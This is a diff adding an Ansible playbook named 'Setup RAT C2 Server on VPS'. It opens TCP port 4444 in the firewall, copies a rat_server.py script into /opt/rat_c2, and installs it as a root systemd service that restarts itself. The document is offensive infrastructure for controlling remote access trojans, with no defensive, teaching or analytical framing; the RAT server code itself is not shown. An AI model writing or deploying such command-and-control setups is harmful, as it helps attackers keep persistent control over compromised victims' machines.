@@ -1,0 +1,68 @@
+---
+- name: Setup RAT C2 Server on VPS
+  hosts: all
+  become: yes
+  vars:
+    rat_port: 4444
+    rat_install_dir: /opt/rat_c2
+
+  tasks:
+    - name: Update apt cache
+      apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Install Python 3 and pip
+      apt:
+        name:
+          - python3
+          - python3-pip
+          - ufw
+        state: present
+
+    - name: Allow RAT port through UFW
+      ufw:
+        rule: allow
+        port: "{{ rat_port }}"
+        proto: tcp
+
+    - name: Create RAT installation directory
+      file:
+        path: "{{ rat_install_dir }}"
+        state: directory
+        mode: '0755'
+
+    - name: Copy server script to VPS
+      copy:
+        src: rat_server.py
+        dest: "{{ rat_install_dir }}/rat_server.py"
+        mode: '0755'
+
+    - name: Create systemd service for RAT server
+      copy:
+        dest: /etc/systemd/system/rat-server.service
+        content: |
+          [Unit]
+          Description=RAT C2 Server
+          After=network.target
+
+          [Service]
+          Type=simple
+          User=root
+          WorkingDirectory={{ rat_install_dir }}
+          ExecStart=/usr/bin/python3 {{ rat_install_dir }}/rat_server.py {{ rat_port }}
+          Restart=always
+          RestartSec=5
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start RAT server service
+      systemd:
+        name: rat-server.service
+        enabled: yes
+        state: restarted
